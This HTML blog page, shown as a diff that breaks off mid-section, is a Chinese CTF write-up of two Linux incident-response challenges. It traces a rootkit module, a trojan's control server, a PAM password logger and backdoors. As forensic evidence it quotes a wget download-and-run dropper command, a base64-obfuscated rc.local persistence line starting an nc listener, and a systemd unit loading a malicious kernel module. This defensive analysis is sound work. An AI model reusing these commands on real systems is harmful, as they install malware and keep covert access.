@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>长城杯半决赛-应急响应+玄机-linux后门应急 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2025长城杯半决赛-应急响应小路是一名网络安全网管，据反映发现公司主机上有异常外联信息，据回忆前段时间执行过某些更新脚本（已删除），现在需要协助小路同学进行网络安全应急响应分析，查找木马，进一步分析，寻找攻击源头，获取攻击者主机权限获取 flag 文件。 1找出主机上木马回连的主控端服务器IP地址[不定时(3~5分钟)周期性]，并以flag{MD5}形式提交，其中MD5加密目标的原始字符串格式I">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长城杯半决赛-应急响应+玄机-linux后门应急">
+<meta property="og:url" content="http://example.com/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/index.html">
+<meta property="og:site_name" content="cheng_xing&#39;s blog">
+<meta property="og:description" content="2025长城杯半决赛-应急响应小路是一名网络安全网管，据反映发现公司主机上有异常外联信息，据回忆前段时间执行过某些更新脚本（已删除），现在需要协助小路同学进行网络安全应急响应分析，查找木马，进一步分析，寻找攻击源头，获取攻击者主机权限获取 flag 文件。 1找出主机上木马回连的主控端服务器IP地址[不定时(3~5分钟)周期性]，并以flag{MD5}形式提交，其中MD5加密目标的原始字符串格式I">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/ltx.jpg">
+<meta property="article:published_time" content="2025-04-30T06:58:22.000Z">
+<meta property="article:modified_time" content="2025-05-01T03:58:42.892Z">
+<meta property="article:author" content="cheng_xing">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/ltx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "长城杯半决赛-应急响应+玄机-linux后门应急",
+  "url": "http://example.com/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/",
+  "image": "http://example.com/img/ltx.jpg",
+  "datePublished": "2025-04-30T06:58:22.000Z",
+  "dateModified": "2025-05-01T03:58:42.892Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cheng_xing",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/ltx.jpg"><link rel="canonical" href="http://example.com/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '长城杯半决赛-应急响应+玄机-linux后门应急',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">长城杯半决赛-应急响应+玄机-linux后门应急</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">长城杯半决赛-应急响应+玄机-linux后门应急</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-30T06:58:22.000Z" title="发表于 2025-04-30 14:58:22">2025-04-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-01T03:58:42.892Z" title="更新于 2025-05-01 11:58:42">2025-05-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/forensics/">forensics</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="2025长城杯半决赛-应急响应"><a href="#2025长城杯半决赛-应急响应" class="headerlink" title="2025长城杯半决赛-应急响应"></a>2025长城杯半决赛-应急响应</h2><p>小路是一名网络安全网管，据反映发现公司主机上有异常外联信息，据回忆前段时间执行过某些更新脚本（已删除），现在需要协助小路同学进行网络安全应急响应分析，查找木马，进一步分析，寻找攻击源头，获取攻击者主机权限获取 flag 文件。</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>找出主机上木马回连的主控端服务器IP地址[不定时(3~5分钟)周期性]，并以flag{MD5}形式提交，其中MD5加密目标的原始字符串格式IP:port。</p>
+<p>根据题目描述，尝试自动化脚本抓心跳，根据ssh主机上的.vimhistory能看到对防火墙的修改，锁定IP范围为192.168.57.210&#x2F;24</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    now = subprocess.check_output([&quot;netstat&quot;,&quot;-pantu&quot;])</span><br><span class="line">    if &quot;192.168.57&quot; in now.decode():</span><br><span class="line">        print(now.decode())</span><br><span class="line">        exit()</span><br><span class="line">    time.sleep(0.1)</span><br></pre></td></tr></table></figure>
+
+<p>但是始终没有看到，猜测是做了rootkit，根据题目描述前段时间执行过某些更新脚本（已删除）猜测需要恢复磁盘中已删除文件</p>
+<p>题目给出了raw镜像，root是空的，那么优先在home下找其它用户，发现ubunt用户，在1.txt中发现可疑信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget –quiet http://mirror.unknownrepo.net/f/l/a/g/system_upgrade -O /tmp/.system_upgrade &amp;&amp; chmod +x /tmp/.system_upgrade &amp;&amp; /tmp/.system_upgrade</span><br></pre></td></tr></table></figure>
+
+<p>使用wegt下载了可疑文件，同时在.viminfo中看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># File marks:</span><br><span class="line">&#x27;0  6  0  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,48,6,0,1740374317,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">&#x27;1  6  0  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,49,6,0,1740374161,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">&#x27;2  5  7  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,50,5,7,1740374151,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">&#x27;3  5  7  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,51,5,7,1740374151,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">&#x27;4  5  7  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,52,5,7,1740374151,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">&#x27;5  5  7  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,53,5,7,1740374151,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">&#x27;6  10  0  /etc/netplan/01-netcfg.yaml</span><br><span class="line">|4,54,10,0,1740369999,&quot;/etc/netplan/01-netcfg.yaml&quot;</span><br><span class="line">&#x27;7  11  4  /etc/netplan/01-netcfg.yaml</span><br><span class="line">|4,55,11,4,1740369946,&quot;/etc/netplan/01-netcfg.yaml&quot;</span><br><span class="line">&#x27;8  7  14  /etc/netplan/01-netcfg.yaml</span><br><span class="line">|4,56,7,14,1740367791,&quot;/etc/netplan/01-netcfg.yaml&quot;</span><br><span class="line">&#x27;9  7  14  /etc/netplan/01-netcfg.yaml</span><br><span class="line">|4,57,7,14,1740367791,&quot;/etc/netplan/01-netcfg.yaml&quot;</span><br><span class="line"></span><br><span class="line"># Jumplist (newest first):</span><br><span class="line">-&#x27;  6  0  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,39,6,0,1740374317,&quot;/etc/systemd/system/system-upgrade.service&quot;</span><br><span class="line">-&#x27;  6  0  /etc/systemd/system/system-upgrade.service</span><br><span class="line">|4,39,6,0,174037</span><br></pre></td></tr></table></figure>
+
+<p>调用了和下载的可疑文件同名的配置文件，而且具有周期性特征，与题目描述相符，跟进查看&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;system-upgrade.service:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=system-upgrade</span><br><span class="line">After=multi-user.target</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/sbin/insmod /lib/modules/5.4.0-84-generic/kernel/drivers/system/system-upgrade.ko</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>可以看到加载了&#x2F;lib&#x2F;modules&#x2F;5.4.0-84-generic&#x2F;kernel&#x2F;drivers&#x2F;system&#x2F;system-upgrade.ko，内核取证，跟进并导出对应文件，这里优先选择逆向分析，函数名做了混淆，但是不影响伪代码的可读性：<br><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/1.png" alt="alt text"></p>
+<p>有三个端口，逐个试一下即可，IP端口为192.168.57.203:4948，最终flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;59110f555b5e5cd0a8713a447b082d63&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>找出主机上驻留的远控木马文件本体，计算该文件的MD5, 结果提交形式： flag{md5}</p>
+<p>同上题，可以看到&#x2F;lib&#x2F;systemd&#x2F;systemd-agentd这个路径<br>在&#x2F;lib&#x2F;systemd&#x2F;下找到systemd-agentd为木马文件本体，计算MD5即可，最终flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bccad26b665ca175cd02aca2903d8b1e&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>找出主机上加载远控木马的持久化程序（下载者），其功能为下载并执行远控木马，计算该文件的MD5, 结果提交形式：flag{MD5}。</p>
+<p>交叉引用查看上题&#x2F;lib&#x2F;systemd&#x2F;systemd-agentd，发现功能之一为下载并执行反向代理<br>因此答案就是system-upgrade.ko，最终flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;78edba7cbd107eb6e3d2f90f5eca734e&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>查找题目3中持久化程序（下载者）的植入痕迹，计算持久化程序植入时的原始名称MD5（仅计算文件名称字符串MD5），并提交对应flag{MD5}。</p>
+<p>在最开始的1.txt中就有，wegt下载后的原始名称为.system_upgrade，MD5即可，最终flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9729aaace6c83b11b17b6bc3b340d00b&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>分析题目2中找到的远控木马，获取木马通信加密密钥, 结果提交形式：flag{通信加密密钥}。</p>
+<p>逆向木马本体&#x2F;lib&#x2F;systemd&#x2F;systemd-agentd，找到start函数：<br><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/2.png" alt="alt text"></p>
+<p>继续跟子函数找通信部分，发现和函数sub_40641D相关：</p>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/3.png" alt="alt text"></p>
+<p>通过字符串定位过去，发现可疑数据，怀疑为加密处理过的通信加密密钥：</p>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/4.png" alt="alt text"></p>
+<p>找引用继续跟，最终定位到函数sub_405EC9:</p>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/5.png" alt="alt text"></p>
+<p>xor了0x69:</p>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/6.png" alt="alt text"></p>
+<p>最终flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ThIS_1S_th3_S3cR3t_fl@g&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="玄机-linux后门应急"><a href="#玄机-linux后门应急" class="headerlink" title="玄机-linux后门应急"></a>玄机-linux后门应急</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>主机后门用户名称：提交格式如：flag{backdoor}</p>
+<p>cat &#x2F;etc&#x2F;passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;backdoor&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p>主机排查项中可以发现到flag{}内以i开头的flag，如flag{ixxxxxxx}</p>
+<p>ps -aux<br><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/7.png" alt="alt text"></p>
+<p>ps -ef也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;infoFl4g&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p>主机排查发现9999端口是通过哪个配置文件如何开机启动的，如&#x2F;etc&#x2F;crontab则填写&#x2F;etc&#x2F;crontab 的md5 ，提交方式示例：flag{md5}</p>
+<p>在&#x2F;etc&#x2F;rc.d&#x2F;rc.local中发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">echo d2hpbGUgdHJ1ZTtkbyBub2h1cCBuYyAtbHZwIDk5OTkgLWMgImZsYWd7aW5mb0ZsNGd9IiAyPiYxIDtzbGVlcCAxO2RvbmU7 | base64 -d | nohup bash &amp;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+<p>base64解码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true;do nohup nc -lvp 9999 -c &quot;flag&#123;infoFl4g&#125;&quot; 2&gt;&amp;1 ;sleep 1;done;</span><br></pre></td></tr></table></figure>
+<p>因此flag为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cf8a978fe83579e2e20ec158524d8c06&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他思路<br>&#x2F;etc&#x2F;systemd&#x2F;system 查看自启动服务的相关配置文件<br>打开 rc-local.service，发现执行了 &#x2F;etc&#x2F;rc.d&#x2F;rc.local 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=/etc/rc.local Compatibility</span><br><span class="line">ConditionPathExists=/etc/rc.d/rc.local</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.d/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>ps -ef发现执行nc -lvp 9999 -c flag{infoFl4g}的进程的PID为498，PPID为492，而492的PPID是1，开机初始化启动的<br>查看服务，发现自启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/8.png" alt="alt text"></p>
+<p>rc.local文件开机自启动，通常位于&#x2F;etc&#x2F;rc.local或&#x2F;etc&#x2F;rc.d&#x2F;rc.local</p>
+<h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p>黑客3s做了记录所有用户的每次登陆的密码的手段，flag为黑客记录的登陆密码日志路径md5,提交方式示例：flag{md5(路径)}</p>
+<p>在 &#x2F;tmp 目录下发现.sshlog 文件<br>&#x2F;tmp&#x2F;.sshlog，md5得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8997d5a1b8dcca5a4be75962250959f7&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他思路</p>
+<p>发现PAM认证模块相关的动态库有两个so比较新，其中一个是bk，可能被修改过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/lib/x86_64-linux-gnu/security</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/9.png" alt="alt text"></p>
+<p>逆向一波发现&#x2F;tmp&#x2F;.sshlog<br><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/10.png" alt="alt text"></p>
+<h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p>给出使用了&#x2F;bin&#x2F;bash 的RCE后门进程名称+端口号 如进程名称为sshd，端口号为22，则flag{sshd22}</p>
+<p>ss查看网络连接发现8080有个python3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/11.png" alt="alt text"></p>
+<p>不出网，本地nc连一下发现是个后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/12.png" alt="alt text"></p>
+<p>故flag为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;python38080&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他思路<br>逐一排查systemctl启动配置文件存放位置<br>&#x2F;etc&#x2F;systemd&#x2F;system<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system<br>&#x2F;lib&#x2F;systemd&#x2F;system</p>
+<p>ls -lat &#x2F;etc&#x2F;systemd&#x2F;system发现可疑文件docker-compose-app.service<br>查看内容</p>
